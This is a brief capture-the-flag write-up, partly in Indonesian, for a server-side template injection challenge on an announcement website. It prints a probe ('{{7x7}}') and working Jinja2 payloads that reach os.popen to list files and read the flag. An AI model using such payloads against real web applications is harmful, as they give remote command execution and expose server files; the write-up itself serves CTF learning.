## Write Up
![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-02-24%20103750.png?raw=true)

# Description
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

# Hints
Server Side Template Injection

# penyelesaian
- buka websitenya
- cek kerentanan SSTI dengan " {{7x7}} "
- masukkan payload ' {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}} ' untuk list file
- masukkan payload ' {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}} ' untuk cat file flagnya
- ketemu deh flag nya
![alt text](https://github.com/bebasaja-1/gambar/blob/main/Screenshot%202026-02-24%20103819.png?raw=true)
